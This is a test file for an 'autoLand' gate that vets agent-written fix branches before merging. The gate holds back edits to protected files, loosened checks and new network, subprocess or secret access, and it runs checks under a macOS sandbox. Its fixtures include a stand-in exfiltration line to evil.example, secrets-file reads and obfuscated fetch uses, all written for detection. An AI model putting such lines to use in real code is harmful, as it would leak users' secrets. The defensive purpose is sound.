import assert from 'node:assert/strict';
import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { test } from 'node:test';
import {
  agentRuntimeClosure,
  autoLand,
  type Exec,
  freshFailures,
  fsWriteViolation,
  GATE_DIFF_FLAGS,
  gateEnv,
  gateSandboxProfile,
  importClosure,
  importSpecs,
  integrityViolation,
  inventoryDrift,
  junitFailures,
  junitInventory,
  parsePatch,
  reachCapableImport,
  reachViolation,
  scopeViolation,
  weakeningViolation,
  withJunit,
} from './auto-land.ts';

const FIX = ['system/kernel/invariants/foo.ts', 'system/kernel/invariants/foo.test.ts'];

/**
 * A fake git/pnpm: answers the read commands from `files`/`dirty`, records every
 * call, and throws for any call whose joined argv matches `fail`.
 */
function fakeExec(
  o: {
    files?: string[];
    numstat?: string;
    dirty?: string;
    fail?: RegExp;
    ahead?: number;
    patch?: string;
    drift?: string;
    lsof?: string;
    raw?: string;
    absent?: string[];
    unreadable?: string;
    ignored?: string;
    shown?: Record<string, string>;
  } = {},
) {
  const calls: string[] = [];
  const raw: string[] = [];
  const exec: Exec = (cmd, args, { cwd }) => {
    raw.push(`${cwd}$ ${cmd} ${args.join(' ')}`);
    // Recorded without git's `-c k=v` hardening pairs (asserted on `raw`).
    const shown: string[] = [];
    for (let i = 0; i < args.length; i++) {
      if (cmd === 'git' && args[i] === '-c') i++;
      else shown.push(args[i] as string);
    }
    const line = `${cwd}$ ${cmd} ${shown.join(' ')}`;
    calls.push(line);
    if (o.fail?.test(line)) {
      throw Object.assign(new Error('boom'), { stdout: 'error TS2322: bad type\n' });
    }
    // Match on the command shape; the hardening flags are asserted separately.
    const a = shown.filter((x) => !GATE_DIFF_FLAGS.includes(x)).join(' ');
    // A sandboxed suite reports JUnit on stdout: one passing case, complete document.
    if (cmd === 'sandbox-exec' && args.includes('sh')) {
      return '<testsuites><testcase name="ok" file="x.test.ts"/></testsuites>\n';
    }
    if (cmd.endsWith('lsof')) return o.lsof ?? 'p1\nn127.0.0.1:6463\nn*:7000\n';
    if (a === 'show HEAD:package.json')
      return JSON.stringify({ scripts: { test: "node --test 'system/**/*.test.ts'" } });
    if (a.startsWith('diff --cached --name-only')) return `${(o.files ?? FIX).join('\n')}\n`;
    if (a.startsWith('diff --cached --numstat'))
      return o.numstat ?? '10\t2\tsystem/kernel/invariants/foo.ts\n';
    if (a === 'status --porcelain') return o.dirty ?? '';
    if (a === 'rev-parse --short HEAD') return 'abc1234\n';
    if (a === 'rev-list --count main..HEAD') return `${o.ahead ?? 0}\n`;
    if (a === 'diff --cached HEAD') return o.patch ?? '';
    if (a === 'diff --name-only') return o.drift ?? '';
    if (a === 'diff --cached --raw HEAD') return o.raw ?? '';
    if (a.startsWith('cat-file -e ') && o.absent?.some((f) => a.endsWith(f))) {
      throw new Error('absent');
    }
    if (a === 'ls-files --others --ignored --exclude-standard')
      return o.ignored ?? 'node_modules\n';
    if (a.startsWith('show ') && o.shown?.[a.slice(5)] !== undefined) return o.shown[a.slice(5)];
    if (a.startsWith('show ') && o.unreadable && a.endsWith(o.unreadable)) {
      throw Object.assign(new Error('read'), { stderr: 'fatal: bad object' });
    }
    return '';
  };
  return { exec, calls, raw };
}

const base = (exec: Exec, pruned: string[] = []) => ({
  repoRoot: '/repo',
  worktree: '/repo/.worktrees/w',
  branch: 'agent/w',
  title: 'debounce staleness repair',
  exec,
  runtimeClosure: () => new Set<string>(),
  platform: 'darwin',
  home: '/Users/sam',
  readGitPointer: () => 'gitdir: /repo/.git/worktrees/w\n',
  makePrivDir: () => '/private/tmp/autoland-test',
  removePrivDir: () => {},
  tmpEntries: () => ['/private/tmp/claude-501', '/private/tmp/autoland-test'],
  baselineFailures: () => ({
    failures: new Map<string, number>(),
    inventory: new Map([['x.test.ts', ['x.test.ts :: ok']]]),
  }),
  reap: () => {},
  reachCapable: () => true,
  nodeModulesLink: () => '/repo/node_modules',
  prune: (_r: string, _w: string, b: string) => {
    pruned.push(b);
  },
});

test('scopeViolation: system/ code with a test passes; everything else is held', () => {
  assert.equal(scopeViolation(FIX), null);
  assert.match(scopeViolation([]) ?? '', /no changes/);
  assert.match(scopeViolation(['user-data/x.ts', 'system/a.test.ts']) ?? '', /outside system/);
  assert.match(
    scopeViolation(['system/agent/run-agent.ts', 'system/a.test.ts']) ?? '',
    /protected/,
  );
  assert.match(scopeViolation(['system/lib/publish/x.ts', 'system/a.test.ts']) ?? '', /protected/);
  assert.match(
    scopeViolation(['system/brain/memory/migrations/040-x.ts', 'system/a.test.ts']) ?? '',
    /protected/,
  );
  assert.match(scopeViolation(['system/kernel/invariants/foo.ts']) ?? '', /no test/);
  const many = Array.from({ length: 9 }, (_, i) => `system/f${i}.test.ts`);
  assert.match(scopeViolation(many) ?? '', /9 files/);
});

test('autoLand: a clean, small, tested fix is verified, committed, merged, built, and pruned', () => {
  const { exec, calls } = fakeExec();
  const pruned: string[] = [];
  const r = autoLand(base(exec, pruned));
  assert.equal(r.landed, true);
  assert.equal(r.commit, 'abc1234');
  const order = [
    /w\$ sandbox-exec -p [\s\S]* env -i [\s\S]* node \/repo\/node_modules\/typescript\/bin\/tsc --noEmit$/,
    /w\$ sandbox-exec [\s\S]* node \/repo\/node_modules\/@biomejs\/biome\/bin\/biome lint system\/kernel\/invariants\/foo.ts system\/kernel\/invariants\/foo.test.ts$/,
    /w\$ sandbox-exec [\s\S]* sh -c node --test --test-reporter=spec --test-reporter-destination=stderr --test-reporter=junit --test-reporter-destination=stdout 'system\/\*\*\/\*\.test\.ts'$/,
    /w\$ git commit --no-verify -m fix\(auto\): debounce staleness repair/,
    /\/repo\$ git merge --no-ff -m Merge auto-fix: debounce staleness repair agent\/w/,
    /\/repo\$ pnpm build/,
  ];
  let at = 0;
  for (const re of order) {
    const i = calls.findIndex((c, j) => j >= at && re.test(c));
    assert.ok(i >= 0, `expected ${re} after call #${at}:\n${calls.join('\n')}`);
    at = i + 1;
  }
  assert.deepEqual(pruned, ['agent/w']);
});

test('autoLand: a failing check holds the branch — nothing is committed or merged', () => {
  const { exec, calls } = fakeExec({ fail: /sh -c node --test/ });
  const r = autoLand(base(exec));
  assert.equal(r.landed, false);
  assert.match(r.reason, /tests failed without a consistent report/);
  assert.ok(!calls.some((c) => /git (commit|merge)/.test(c)));
});

test('autoLand: never touches a file with uncommitted work in main', () => {
  const { exec, calls } = fakeExec({ dirty: ' M system/kernel/invariants/foo.ts\n?? notes.md\n' });
  const r = autoLand(base(exec));
  assert.equal(r.landed, false);
  assert.match(r.reason, /overlaps uncommitted work in main: system\/kernel\/invariants\/foo.ts/);
  assert.ok(!calls.some((c) => /tsc --noEmit/.test(c)), 'held before any verification runs');
});

test('autoLand: an oversized diff is held', () => {
  const { exec } = fakeExec({ numstat: '300\t150\tsystem/kernel/invariants/foo.ts\n' });
  const r = autoLand(base(exec));
  assert.equal(r.landed, false);
  assert.match(r.reason, /450 lines changed/);
});

test('autoLand: a build failure after the merge reverts it and rebuilds', () => {
  let builds = 0;
  const { exec: inner, calls } = fakeExec();
  const exec: Exec = (cmd, args, o) => {
    if (cmd === 'pnpm' && args[0] === 'build' && builds++ === 0) {
      calls.push(`${o.cwd}$ pnpm build (failed)`);
      throw Object.assign(new Error('build'), { stderr: 'error: tsc exited 2' });
    }
    return inner(cmd, args, o);
  };
  const pruned: string[] = [];
  const r = autoLand(base(exec, pruned));
  assert.equal(r.landed, false);
  assert.match(r.reason, /build failed after merge \(abc1234 reverted\)/);
  assert.ok(calls.some((c) => /\/repo\$ git revert -m 1 --no-edit abc1234/.test(c)));
  assert.equal(builds, 2, 'rebuilt after the revert so dist matches the tree');
  assert.deepEqual(pruned, [], 'the branch survives for review');
});

test('autoLand: a failed merge is aborted and held', () => {
  const { exec, calls } = fakeExec({ fail: /git merge --no-ff/ });
  const r = autoLand(base(exec));
  assert.equal(r.landed, false);
  assert.match(r.reason, /merge into main failed/);
  assert.ok(calls.some((c) => /git merge --abort/.test(c)));
  assert.ok(!calls.some((c) => /pnpm build/.test(c)));
});

test('autoLand: a branch with commits ahead of main (pre-squash history) is held untouched', () => {
  const { exec, calls } = fakeExec({ ahead: 707 });
  const r = autoLand(base(exec));
  assert.equal(r.landed, false);
  assert.match(r.reason, /707 commit\(s\) ahead of main/);
  assert.ok(
    !calls.some((c) => /git (add|commit|merge)/.test(c)),
    'nothing staged, committed or merged',
  );
});

test('scopeViolation: anything the agent runtime imports is protected, plus surfaces/config/audit', () => {
  const runtime = new Set(['system/lib/paths.ts']);
  assert.match(
    scopeViolation(['system/lib/paths.ts', 'system/a.test.ts'], runtime) ?? '',
    /protected/,
  );
  for (const f of [
    'system/kernel/config/schema.ts',
    'system/surfaces/mcp/core/server.ts',
    'system/jobs/builtin/agent-runner/index.ts',
    'system/brain/cognition/reliability-audit.ts',
    'system/lib/remediation-request.ts',
  ]) {
    assert.match(scopeViolation([f, 'system/a.test.ts']) ?? '', /protected/, f);
  }
});

test('importClosure: follows relative imports (.ts and .js specifiers) and skips missing files', () => {
  const files: Record<string, string> = {
    'system/agent/a.ts': "import { b } from '../lib/b.ts';\nimport x from 'node:fs';",
    'system/lib/b.ts': "export * from './c.js';\nconst d = await import('../kernel/d.ts');",
    'system/lib/c.ts': "import './gone.ts';",
    'system/kernel/d.ts': '',
  };
  const closure = importClosure(['system/agent/a.ts'], (p) => files[p] ?? null);
  assert.deepEqual([...closure].sort(), [
    'system/agent/a.ts',
    'system/kernel/d.ts',
    'system/lib/b.ts',
    'system/lib/c.ts',
  ]);
});

test("agentRuntimeClosure: the live runtime covers its config + paths but not K's usual targets", () => {
  const closure = agentRuntimeClosure(process.cwd());
  assert.ok(closure.has('system/kernel/config/schema.ts'));
  assert.ok(closure.has('system/lib/paths.ts'));
  assert.ok(closure.has('system/agent/run-agent.ts'));
  assert.ok(!closure.has('system/kernel/runtime/health-monitor.ts'), 'health fixes stay landable');
});

test('autoLand: an unreadable import graph fails closed', () => {
  const { exec, calls } = fakeExec();
  const r = autoLand({
    ...base(exec),
    runtimeClosure: () => {
      throw new Error('ENOENT system/agent');
    },
  });
  assert.equal(r.landed, false);
  assert.match(r.reason, /could not map the agent runtime's imports/);
  assert.ok(!calls.some((c) => /git (commit|merge)/.test(c)));
});

test('reachViolation: new egress in non-test code is held; tests and plain logic pass', () => {
  const patch = (file: string, line: string) =>
    `diff --git a/${file} b/${file}\n--- a/${file}\n+++ b/${file}\n@@ -1 +1,2 @@\n ctx\n+${line}\n`;
  assert.equal(reachViolation(patch('system/kernel/x.ts', 'const gap = now - last;')), null);
  assert.match(
    reachViolation(patch('system/kernel/x.test.ts', "await fetch('http://x');")) ?? '',
    /adds network/,
    'a landed test runs unsandboxed later — egress in tests is held too',
  );
  for (const line of [
    "await fetch('https://example.com/c', { body });",
    "import { spawn } from 'node:child_process';",
    'const t = process.env.DISCORD_BOT_TOKEN;',
    "execFileSync('curl', [u]);",
    'eval(code);',
  ]) {
    assert.match(
      reachViolation(patch('system/kernel/x.ts', line)) ?? '',
      /adds network\/process\/env/,
      line,
    );
  }
  // Removed lines never count.
  assert.equal(reachViolation('+++ b/system/kernel/x.ts\n@@ -1 +1 @@\n-await fetch(u);\n'), null);
});

test('autoLand: a diff that adds egress is held before verification', () => {
  const { exec, calls } = fakeExec({
    patch:
      "+++ b/system/kernel/invariants/foo.ts\n@@ -1 +1 @@\n+await fetch('https://evil.example/x?d=' + secret);\n",
  });
  const r = autoLand(base(exec));
  assert.equal(r.landed, false);
  assert.match(r.reason, /adds network\/process\/env access: system\/kernel\/invariants\/foo.ts/);
  assert.ok(!calls.some((c) => /tsc --noEmit|sh -c/.test(c)));
});

test('autoLand: a build that fails with and without the fix is blamed on main, not the fix', () => {
  const { exec: inner } = fakeExec();
  const exec: Exec = (cmd, args, o) => {
    if (cmd === 'pnpm' && args[0] === 'build')
      throw Object.assign(new Error('b'), { stderr: 'error: x' });
    return inner(cmd, args, o);
  };
  const r = autoLand(base(exec));
  assert.equal(r.landed, false);
  assert.match(r.reason, /broken without this fix too .* abc1234 reverted, dist\/ is stale/);
});

test('autoLand: diffs against the branch base, never the moving main ref', () => {
  const { exec, calls } = fakeExec();
  autoLand(base(exec));
  assert.ok(
    calls.some((c) =>
      / git diff --cached --name-only HEAD --no-renames --no-ext-diff --no-textconv --text$/.test(
        c,
      ),
    ),
  );
  assert.ok(!calls.some((c) => /git diff --cached [^ ]* ?main$/.test(c)));
});

test('reachViolation: test files may use env/URLs but never network, subprocess or secrets', () => {
  const t = (line: string) => `+++ b/system/kernel/x.test.ts\n@@ -1 +1 @@\n+${line}\n`;
  assert.equal(
    reachViolation(t("process.env.ROBIN_USER_DATA_DIR = dir; // 'https://askrobin.io/x'")),
    null,
  );
  assert.equal(
    reachViolation(t('const m = /a/.exec(s);')),
    null,
    'regex .exec is not a subprocess',
  );
  for (const line of [
    "await fetch('https://x.example');",
    "import { execSync } from 'node:child_process';",
    "readFileSync(join(root, 'user-data/config/secrets/.env'));",
    "const f = globalThis['fe' + 'tch'];",
    "const m = await import('node:' + 'net');",
  ]) {
    assert.match(reachViolation(t(line)) ?? '', /adds network/, line);
  }
});

test('reachViolation: a new import in non-test code is held; an existing one is not', () => {
  const patch = '+++ b/system/kernel/x.ts\n@@ -1 +1 @@\n+const a = 1;\n';
  const added = () => ['../integrations/builtin/discord/index.ts'];
  assert.match(
    reachViolation(patch, added) ?? '',
    /adds imports: system\/kernel\/x.ts ← ..\/integrations\/builtin\/discord\/index.ts/,
  );
  assert.equal(
    reachViolation(patch, () => []),
    null,
    'no new imports → allowed',
  );
  assert.match(
    reachViolation('+++ b/system/kernel/x.test.ts\n@@ -1 +1 @@\n+const h = 1;\n', added) ?? '',
    /adds imports: system\/kernel\/x.test.ts ← ..\/integrations/,
    'a landed test runs unsandboxed later — it may not pull in a notifier either',
  );
});

test('gateSandboxProfile: deny-by-default reads, loopback minus live ports, private temp, sealed .git', () => {
  const p = gateSandboxProfile({
    worktree: '/r/.worktrees/w',
    repoRoot: '/r',
    home: '/Users/sam',
    privDir: '/private/tmp/autoland-x',
    nodeDir: '/Users/sam/.nvm/versions/node/v24/bin',
    listeningPorts: [6463, 20241],
    tmpEntries: ['/private/tmp/claude-501', '/private/tmp/autoland-x', '/private/var/tmp/x'],
    uid: 501,
  });
  assert.match(p, /\(deny network\*\)/);
  assert.match(p, /\(allow network-outbound \(remote tcp "localhost:\*"\)\)/);
  assert.match(
    p,
    /\(deny network-outbound \(remote tcp "localhost:6463"\) \(remote tcp "localhost:20241"\)\)/,
    'real local services stay unreachable',
  );
  assert.match(p, /com\.apple\.dnssd\.service/);
  assert.match(p, /\(deny file-read-data\)\n\(allow file-read-data /);
  const readable = p.split('\n').find((l) => l.startsWith('(allow file-read-data')) ?? '';
  assert.ok(readable.includes('"/r/node_modules"') && readable.includes('"/r/.worktrees/w"'));
  assert.ok(
    !readable.includes('(subpath "/r")') && !readable.includes('(subpath "/Users/sam")'),
    'not the checkout or ~ (only the home dir entry itself, for path resolution)',
  );
  assert.match(
    p,
    /\(deny file-read-data file-write\* \(subpath "\/private\/tmp\/claude-501"\) \(subpath "\/private\/var\/tmp\/x"\)\)/,
    'existing temp entries are sealed',
  );
  assert.match(p, /\(allow file-read-data \(subpath "\/private\/tmp\/tsx-501"\)\)/);
  assert.doesNotMatch(p, /allow file-write\*[^\n]*tsx-501/, 'shared tsx cache is never writable');
  assert.doesNotMatch(
    p,
    /deny file-read-data file-write\*[^\n]*autoland-x/,
    'own private dir stays open',
  );
  const last = p.trim().split('\n').at(-1) ?? '';
  assert.match(
    last,
    /^\(deny file-write\* \(literal "\/r\/\.worktrees\/w\/\.git"\)/,
    '.git sealed last',
  );
});

test('parsePatch: a content line shaped like a header cannot re-label the file', () => {
  const patch = [
    'diff --git a/system/kernel/x.ts b/system/kernel/x.ts',
    '--- a/system/kernel/x.ts',
    '+++ b/system/kernel/x.ts',
    '@@ -1 +1,3 @@',
    '+const s = `',
    '+++ b/system/kernel/x.test.ts',
    // biome-ignore lint/suspicious/noTemplateCurlyInString: literal patch text, not a template
    "+${await fetch('https://e.example')}`;",
  ].join('\n');
  assert.deepEqual([...parsePatch(patch).keys()], ['system/kernel/x.ts']);
  assert.match(reachViolation(patch) ?? '', /system\/kernel\/x.ts: fetch/);
});

test('importSpecs: multi-line, re-export, dynamic and require imports are all seen', () => {
  const src = [
    'import {',
    '  notifyDiscordAction,',
    "} from '../integrations/builtin/discord/index.ts';",
    "export * from './a.ts';",
    "const m = await import('./b.ts');",
    "const c = require('node:child_process');",
  ].join('\n');
  assert.deepEqual([...importSpecs(src)].sort(), [
    '../integrations/builtin/discord/index.ts',
    './a.ts',
    './b.ts',
    'node:child_process',
  ]);
});

test('reachViolation: bare references count, not just calls', () => {
  const t = (line: string) => `+++ b/system/kernel/x.ts\n@@ -1 +1 @@\n+${line}\n`;
  for (const line of ['const f = fetch;', 'const run = spawn;', "const cp = 'child_process';"]) {
    assert.match(reachViolation(t(line)) ?? '', /adds network/, line);
  }
});

test('autoLand: a .git pointer outside the repo admin dir is held before any git runs', () => {
  const { exec, calls } = fakeExec();
  const r = autoLand({ ...base(exec), readGitPointer: () => 'gitdir: /private/tmp/evil\n' });
  assert.equal(r.landed, false);
  assert.match(r.reason, /\.git pointer leaves the repo's worktree admin dir/);
  assert.equal(calls.length, 0, 'no git command ran against the hostile pointer');
});

test('autoLand: a .git pointer changed during the checks holds the land', () => {
  const { exec, calls } = fakeExec();
  let reads = 0;
  const r = autoLand({
    ...base(exec),
    readGitPointer: () => (reads++ === 0 ? 'gitdir: /repo/.git/worktrees/w\n' : 'gitdir: /tmp/x\n'),
  });
  assert.equal(r.landed, false);
  assert.match(r.reason, /changed the worktree's \.git pointer/);
  assert.ok(!calls.some((c) => /commit|merge/.test(c)));
});

test('autoLand: the private temp dir is removed even when a check fails', () => {
  const removed: string[] = [];
  const { exec } = fakeExec({ fail: /tsc --noEmit/ });
  autoLand({ ...base(exec), removePrivDir: (d: string) => removed.push(d) });
  assert.deepEqual(removed, ['/private/tmp/autoland-test']);
});

test('autoLand: no OS sandbox → nothing runs, nothing lands', () => {
  const { exec, calls } = fakeExec();
  const r = autoLand({ ...base(exec), platform: 'linux' });
  assert.equal(r.landed, false);
  assert.match(r.reason, /no OS sandbox/);
  assert.ok(!calls.some((c) => /tsc --noEmit|sh -c/.test(c)));
});

test('autoLand: edits the checks leave in the worktree hold the land', () => {
  const { exec, calls } = fakeExec({ drift: 'system/kernel/invariants/foo.ts\n' });
  const r = autoLand(base(exec));
  assert.equal(r.landed, false);
  assert.match(r.reason, /the checks modified the worktree: system\/kernel\/invariants\/foo.ts/);
  assert.ok(!calls.some((c) => /git (commit|merge)/.test(c)));
});

// ── Weakening guard ─────────────────────────────────────────────────────────────

const diff = (file: string, removed: string[], added: string[]) =>
  [
    `--- a/${file}`,
    `+++ b/${file}`,
    '@@ -1 +1 @@',
    ...removed.map((l) => `-${l}`),
    ...added.map((l) => `+${l}`),
  ].join('\n');

test('weakeningViolation: a raised threshold in check code is held; elsewhere it is not', () => {
  const inv = 'system/kernel/invariants/builtins/integration-staleness.ts';
  assert.match(
    weakeningViolation(
      diff(inv, ['const STALE_MULTIPLIER = 3;'], ['const STALE_MULTIPLIER = 30;']),
    ) ?? '',
    /changes a threshold/,
  );
  assert.equal(
    weakeningViolation(diff('system/lib/sky/score.ts', ['const W = 3;'], ['const W = 30;'])),
    null,
    'only check code is threshold-guarded',
  );
});

test('weakeningViolation: severity downgrades, early passes and dropped invariants are held', () => {
  const inv = 'system/kernel/invariants/builtins/db-reachable.ts';
  assert.match(
    weakeningViolation(diff(inv, ["severity: 'critical',"], ["severity: 'warning',"])) ?? '',
    /downgrades a severity/,
  );
  assert.match(
    weakeningViolation(diff(inv, ["severity: 'warning',"], ["severity: 'info',"])) ?? '',
    /downgrades a severity/,
  );
  assert.match(
    weakeningViolation(diff(inv, [], ['if (quiet) return { ok: true };'])) ?? '',
    /adds an early pass/,
  );
  assert.match(
    weakeningViolation(
      diff('system/kernel/invariants/doctor-set.ts', ['dbReachableInvariant(db),'], []),
    ) ?? '',
    /drops dbReachableInvariant/,
  );
});

test('weakeningViolation: removed, rewritten or skipped assertions are held; moved ones are not', () => {
  const t = 'system/kernel/x.test.ts';
  assert.match(
    weakeningViolation(diff(t, ['assert.equal(open.length, 0);'], [])) ?? '',
    /removes or rewrites 1/,
  );
  assert.match(
    weakeningViolation(
      diff(t, ['assert.equal(open.length, 0);'], ['assert.equal(open.length, 1);']),
    ) ?? '',
    /removes or rewrites/,
  );
  assert.match(
    weakeningViolation(diff(t, [], ["test.skip('flaky', () => {});"])) ?? '',
    /skips or narrows/,
  );
  assert.equal(
    weakeningViolation(
      diff(t, ['  assert.equal(a, 1);'], ['assert.equal(a, 1);', 'assert.equal(b, 2);']),
    ),
    null,
    're-indented assertion + a new one is not a weakening',
  );
});

test('weakeningViolation: adding a check or an assertion is never held', () => {
  assert.equal(
    weakeningViolation(
      diff(
        'system/kernel/runtime/health-monitor.ts',
        ['lastWakeAt: () => this.wokeAt,'],
        ['lastWakeAt: () => {', 'this.noteSleep();', 'return this.wokeAt;', '},'],
      ),
    ),
    null,
  );
  assert.equal(
    weakeningViolation(
      diff('system/kernel/x.test.ts', [], ["test('new', () => {", 'assert.ok(x);', '});']),
    ),
    null,
  );
});

test('autoLand: a loosened check is held before verification', () => {
  const { exec, calls } = fakeExec({
    patch: diff(
      'system/kernel/invariants/builtins/foo.ts',
      ['const MAX_AGE_H = 6;'],
      ['const MAX_AGE_H = 48;'],
    ),
  });
  const r = autoLand(base(exec));
  assert.equal(r.landed, false);
  assert.match(r.reason, /loosens a check: .*changes a threshold/);
  assert.ok(!calls.some((c) => /tsc --noEmit|sh -c/.test(c)));
});

test('autoLand: every gate diff ignores renames, diff drivers and binary hiding', () => {
  const { exec, calls } = fakeExec();
  autoLand(base(exec));
  const diffs = calls.filter((c) => / git diff /.test(c));
  assert.ok(diffs.length >= 3);
  for (const c of diffs) {
    // The binary probe deliberately omits --text; every other flag applies to all.
    for (const f of GATE_DIFF_FLAGS) {
      if (f === '--text' && / --numstat /.test(c) && !c.includes('--text')) continue;
      assert.ok(c.includes(f), `${f} missing: ${c}`);
    }
  }
});

test('autoLand: a .gitattributes change or a binary file is held before verification', () => {
  for (const o of [
    {
      files: [
        'system/kernel/invariants/foo.ts',
        'system/kernel/invariants/foo.test.ts',
        '.gitattributes',
      ],
    },
    // Case-folding filesystems (macOS, core.ignorecase) read this as .gitattributes.
    {
      files: [
        'system/kernel/invariants/foo.ts',
        'system/kernel/invariants/foo.test.ts',
        'system/.GitAttributes',
      ],
    },
    {
      files: [
        'system/kernel/invariants/foo.ts',
        'system/kernel/invariants/foo.test.ts',
        '.gitmodules',
      ],
    },
    { numstat: '-\t-\tsystem/kernel/blob.bin\n' },
  ]) {
    const { exec, calls } = fakeExec(o);
    const r = autoLand(base(exec));
    assert.equal(r.landed, false);
    assert.ok(!calls.some((c) => /pnpm test/.test(c)), 'nothing ran');
  }
});

test('autoLand: binary detection uses a numstat WITHOUT --text (which would hide binaries)', () => {
  const { exec, calls } = fakeExec();
  autoLand(base(exec));
  const numstats = calls.filter((c) => / git diff --cached --numstat /.test(c));
  assert.ok(
    numstats.some((c) => !c.includes('--text')),
    'a binary-revealing numstat runs',
  );
});

test('autoLand: every worktree git call runs with hooks, fsmonitor and signing off', () => {
  const { exec, raw } = fakeExec();
  autoLand(base(exec));
  const wt = raw.filter((c) => c.startsWith('/repo/.worktrees/w$ git '));
  assert.ok(wt.length >= 8);
  for (const c of wt) {
    assert.ok(
      c.includes('-c core.hooksPath=/dev/null -c core.fsmonitor=false -c commit.gpgsign=false'),
      c,
    );
  }
});

test('reachViolation: tests may add only harness, inert built-in and same-directory imports', () => {
  const t = '+++ b/system/kernel/x.test.ts\n@@ -1 +1 @@\n+const h = 1;\n';
  for (const ok of ['node:test', 'node:assert/strict', 'node:fs', './x.ts', './helpers.ts']) {
    assert.equal(
      reachViolation(
        t,
        () => [ok],
        () => false,
      ),
      null,
      ok,
    );
  }
  for (const bad of [
    '../lib/notify/operator.ts',
    './sub/deeper.ts',
    'node:child_process',
    'node:http',
    'undici',
  ]) {
    assert.match(
      reachViolation(
        t,
        () => [bad],
        () => false,
      ) ?? '',
      /adds imports/,
      bad,
    );
  }
});

test('autoLand: an unknown set of listening ports holds the land (never opens all loopback)', () => {
  for (const lsof of ['', 'p1\n']) {
    const { exec, calls } = fakeExec({ lsof });
    const r = autoLand(base(exec));
    assert.equal(r.landed, false);
    assert.match(r.reason, /couldn't enumerate listening ports/);
    assert.ok(!calls.some((c) => /tsc --noEmit|sh -c/.test(c)));
  }
  const { exec } = fakeExec({ fail: /lsof/ });
  assert.match(autoLand(base(exec)).reason, /couldn't enumerate listening ports/);
});

test('gateSandboxProfile: only allowlisted programs run; app/keychain/clipboard services denied; reserved temp names', () => {
  const p = gateSandboxProfile({
    worktree: '/r/.worktrees/w',
    repoRoot: '/r',
    home: '/Users/sam',
    privDir: '/private/tmp/autoland-x',
    nodeDir: '/n/bin',
    listeningPorts: [6463],
    tmpEntries: [],
    uid: 501,
  });
  assert.match(p, /\(deny process-exec\)\n\(allow process-exec \(literal "\/usr\/bin\/env"\)/);
  const exec = p.split('\n').find((l) => l.startsWith('(allow process-exec')) ?? '';
  assert.ok(
    exec.includes('(literal "/n/bin/node")') && exec.includes('(subpath "/r/node_modules")'),
  );
  for (const never of [
    'launchctl',
    'osascript',
    '/usr/bin/open',
    'security',
    'clang',
    '/private/tmp',
    '/r/.worktrees',
  ]) {
    assert.ok(!exec.includes(never), `${never} must not be executable`);
  }
  for (const svc of [
    'launchservicesd',
    'appleevents',
    'SecurityServer',
    'securityd',
    'pasteboard',
  ]) {
    assert.match(p, new RegExp(`\\(deny mach-lookup[^\\n]*${svc}`), svc);
  }
  assert.ok(
    p.includes(String.raw`(deny file-write* (regex #"^/private/(var/)?tmp/(\.|tsx-|claude-`),
    'reserved names regex is emitted raw (single backslashes)',
  );
  const lines = p.split('\n');
  assert.ok(
    lines.findIndex((l) => l === '(allow file-write* (subpath "/private/tmp/autoland-x"))') >
      lines.findIndex((l) => l.includes('(regex #')),
    'own private dir re-allowed after the reserved-name deny',
  );
});

const junit = (cases: Array<[string, string[], boolean]>) =>
  `<testsuites>${cases
    .map(([file, path, failed]) => {
      const name = path.at(-1);
      const open = path
        .slice(0, -1)
        .map((p) => `<testsuite name="${p}">`)
        .join('');
      const close = path
        .slice(0, -1)
        .map(() => '</testsuite>')
        .join('');
      return `${open}<testcase name="${name}" file="/wt/${file}"${failed ? ' failure="x"' : ''}/>${close}`;
    })
    .join('')}</testsuites>`;

test('junitFailures: keys by file + suite path, counts duplicates, ignores passes', () => {
  const f = junitFailures(
    junit([
      ['system/a.test.ts', ['outer', 'same'], true],
      ['system/a.test.ts', ['same'], true],
      ['system/b.test.ts', ['same'], true],
      ['system/b.test.ts', ['same'], true],
      ['system/b.test.ts', ['ok'], false],
    ]),
    ['/wt'],
  );
  assert.deepEqual(Object.fromEntries(f), {
    'system/a.test.ts :: outer > same': 1,
    'system/a.test.ts :: same': 1,
    'system/b.test.ts :: same': 2,
  });
});

test('freshFailures: a same-named extra failure or any failure in a touched file is fresh', () => {
  const base = new Map([['system/tests/hooks.test.ts :: git hooks: pre-commit', 1]]);
  assert.deepEqual(freshFailures(new Map(base), base, ['system/kernel/invariants/foo.ts']), []);
  assert.deepEqual(
    freshFailures(new Map([['system/tests/hooks.test.ts :: git hooks: pre-commit', 2]]), base, []),
    ['system/tests/hooks.test.ts :: git hooks: pre-commit'],
    'a second failure borrowing the name is not excused',
  );
  assert.deepEqual(
    freshFailures(new Map(base), base, ['system/tests/hooks.test.ts']),
    ['system/tests/hooks.test.ts :: git hooks: pre-commit'],
    'a file the diff touches gets no baseline excuse',
  );
});

test('withJunit: console reporter to stderr, JUnit to stdout, node --test commands only', () => {
  assert.equal(
    withJunit("node --test --test-concurrency=8 'system/**/*.test.ts'"),
    "node --test --test-reporter=spec --test-reporter-destination=stderr --test-reporter=junit --test-reporter-destination=stdout --test-concurrency=8 'system/**/*.test.ts'",
  );
  assert.equal(withJunit('vitest run'), null);
});

function suiteExec(failing: Array<[string, string[]]>, report?: string) {
  const { exec: inner, calls } = fakeExec();
  const xml =
    report ??
    junit(failing.map(([f, p]) => [f, p, true])).replaceAll('/wt/', '/repo/.worktrees/w/');
  const exec: Exec = (cmd, args, o) => {
    if (cmd === 'sandbox-exec' && args.includes('sh')) {
      calls.push(`${o.cwd}$ suite`);
      // node --test exits non-zero when a case failed; the report is on stdout.
      if (xml.includes('failure=')) throw Object.assign(new Error('suite failed'), { stdout: xml });
      return xml;
    }
    return inner(cmd, args, o);
  };
  return { exec, calls };
}

/** A baseline result from a JUnit document built with `junit()` ('/wt/' paths). */
const resultOf = (cases: Array<[string, string[], boolean]>) => {
  const xml = junit(cases);
  return { failures: junitFailures(xml, ['/wt']), inventory: junitInventory(xml, ['/wt']) };
};
const HOOKS: [string, string[]] = ['system/tests/hooks.test.ts', ['git hooks: pre-commit']];

test('autoLand: failures the base also has (sandbox-incompatible tests) do not block', () => {
  const { exec } = suiteExec([HOOKS]);
  const r = autoLand({ ...base(exec), baselineFailures: () => resultOf([[...HOOKS, true]]) });
  assert.equal(r.landed, true);
});

test('autoLand: a failure the base does not have holds the land', () => {
  const { exec, calls } = suiteExec([
    HOOKS,
    ['system/kernel/x.test.ts', ['staleness: regression']],
  ]);
  const r = autoLand({
    ...base(exec),
    baselineFailures: () =>
      resultOf([
        [...HOOKS, true],
        ['system/kernel/x.test.ts', ['staleness: regression'], false],
      ]),
  });
